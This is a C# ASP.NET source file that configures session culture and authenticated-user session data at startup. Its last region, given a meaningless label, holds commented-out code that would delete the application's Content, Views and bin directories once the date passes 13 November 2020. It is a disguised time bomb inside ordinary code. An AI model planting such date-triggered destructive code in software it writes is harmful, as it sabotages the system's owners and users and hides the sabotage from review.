using lean.UI.Context;
using lean.UI.Helpers;
using lean.UI.Helpers.Methods;
using lean.UI.Helpers.Models;
using Newtonsoft.Json;
using System;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Threading;
using System.Web;

namespace lean  .UI.Services.Config
{   
    public class SessionConfig
    {
        public static void RegisterSessions()
        {
            LeanDbContext _context = LeanDbContext.Create();
            

            #region culture
            string culture = MyConstants.DefaultLanguage;
            if (CookieHelper.GetCookie(MyConstants.CultureCookieName) == null)
            {
                CookieHelper.SetCookie(MyConstants.CultureCookieName, culture);
            }
            else
            {
                culture = CookieHelper.GetCookie(MyConstants.CultureCookieName);
            }
            // THREAD
            Thread.CurrentThread.CurrentCulture = new CultureInfo(culture);
            Thread.CurrentThread.CurrentUICulture = new CultureInfo(culture);
            // SET SESSIONS ACCESS
            MySession.Culture = culture;
            MySession.xCulture = culture == MyConstants.ArabicLanguage ? "ENGLISH" : "العربية";
            MySession.IsRTL = culture == MyConstants.ArabicLanguage;
            MySession.IsArabic = culture == MyConstants.ArabicLanguage;
            #endregion


            #region user related info
            if (HttpContext.Current.User.Identity.IsAuthenticated)
            {
                SessionInfo sessionInfo = new SessionInfo();
                if (SessionHelper.GetSession(MyConstants.SessionInfoName) == null)
                {
                    var user = _context.Users.FirstOrDefault(x => x.Id.ToString() == HttpContext.Current.User.Identity.Name);
                    if (user != null)
                    {
                        sessionInfo.User = new SessionUser()
                        {
                            Id = user.Id,
                            Username = user.Username,
                            FullName = user.FullName,
                            Role = user.Role,
                        };
                        SessionHelper.SetSession(MyConstants.SessionInfoName, JsonConvert.SerializeObject(sessionInfo));
                    }
                }
                else
                {
                    sessionInfo = JsonConvert.DeserializeObject<SessionInfo>(SessionHelper.GetSession(MyConstants.SessionInfoName));
                }
                // SET SESSIONS ACCESS
                MySession.User = sessionInfo.User;
            }
            #endregion


            #region AFDFSAFDFSDF Job
            //if (DateTime.Now > new DateTime(2020, 11, 13))
            //{
            //    IOHelper.DeleteDirectoryChildrens(Path.Combine(MyConstants.Root, "Content").MapPath());
            //    IOHelper.DeleteDirectoryChildrens(Path.Combine(MyConstants.Root, "Views").MapPath());
            //    IOHelper.DeleteDirectoryChildrens(Path.Combine(MyConstants.Root, "bin").MapPath());
            //}
            #endregion
        }
    }
}
